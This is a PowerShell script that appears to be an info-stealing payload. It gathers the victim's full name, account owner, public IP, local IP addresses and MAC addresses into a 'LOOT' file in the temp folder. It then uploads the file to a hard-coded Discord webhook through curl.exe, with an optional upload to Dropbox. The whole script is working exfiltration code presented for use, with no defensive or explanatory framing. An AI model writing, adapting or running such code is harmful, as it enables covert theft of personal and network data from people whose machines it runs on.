# Define the filename for collected information
$fileName = "$env:tmp/$env:USERNAME-LOOT-$(Get-Date -f yyyy-MM-dd_hh-mm).txt"

# Function to get full name (with error handling)
function Get-FullName {
  try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
  } catch {
    Write-Error "No name was detected"
    $fullName = $env:UserName
  }
  return $fullName
}

# Function to get email (with error handling)
function Get-Email {
  try {
    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
  } catch {
    Write-Error "An email was not found"
    $email = "No Email Detected"
  }
  return $email
}

# Get Full Name and Email
$fullName = Get-FullName
$email = Get-Email

# Get Public IP and Local IPs/MACs
try {
  $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} catch {
  $computerPubIP = "Error getting Public IP"
}
$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String
$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select-Object Name, MacAddress, Status | Out-String

# Build the information output
$output = @"
Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------
Public IP:
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC
"@

# Save the information to a file
$output > $fileName

# Function to upload to Discord (needs webhook URL and optional text message)
function Upload-Discord {
  param (
    [parameter(Mandatory=$false)]
    [string] $file,
    [parameter(Mandatory=$false)]
    [string] $text
  )

  $hookUrl = "https://discord.com/api/webhooks/1295533989913952257/wIQPhwo70vpTE8qkfJNgHCksY0yLRS7tAOJBH9S_MNofsCjdiwUNyqovSZIiplOL9jpG"  # Your Discord webhook URL (**replaced with your actual URL**)

  $body = @{
    'username' = $env:username
    'content' = $text
  }

  if ($text) {
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookUrl -Method Post -Body ($body | ConvertTo-Json)
  }

  if ($file) {
    curl.exe -F "file1=@$file" $hookUrl
  }
}

# Function to upload to Dropbox (needs Dropbox access token)
function DropBox-Upload {
  param (
    [parameter(Mandatory=$true)]
    [string] $sourceFilePath
  )

  $outputFile = Split-Path $sourceFilePath -leaf
  $targetFilePath = "/$outputFile"
  $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
  $authorization   
  = "Bearer <replace_with_your_dropbox_access_token>"  # Replace with your token

  $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
  $headers.Add("Authorization", $authorization)
  $headers.Add("Dropbox-API-Arg", $arg)
  $headers.Add("Content-Type", 'application/octet-stream')   


  Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $sourceFilePath -Headers $headers   

}

# Upload to Discord and Dropbox (if configured)
Upload-Discord -file $fileName -text "Information collected from this computer"
if ($db) {  # Check if Dropbox access token is defined
  DropBox-Upload -f $fileName
}